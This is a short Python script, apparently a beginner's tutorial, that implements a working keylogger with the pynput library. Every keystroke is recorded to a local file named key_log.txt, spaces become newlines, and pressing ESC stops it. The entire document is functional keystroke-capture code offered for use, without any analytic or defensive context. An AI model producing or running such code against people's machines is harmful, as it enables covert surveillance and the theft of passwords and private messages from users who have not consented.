from pynput.keyboard import Key, Listener

# This is where we store the keys as a list temporarily
keys = []


log_file = "key_log.txt"

# This function runs every time a key is pressed
def on_press(key):
    keys.append(key) 
    write_file(keys) 
    keys.clear()     

# This function writes the pressed key to a file
def write_file(keys):
    with open(log_file, "a") as f: 
        for key in keys:
            k = str(key).replace("'", "")  
            if k.find("space") > 0:
                f.write('\n')  
            elif k.find("Key") == -1:
                f.write(k)

# This function runs if you stop the program manually (optional)
def on_release(key):
    if key == Key.esc:  # If you press ESC, stop the keylogger
        return False

# Start the listener (main part)
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
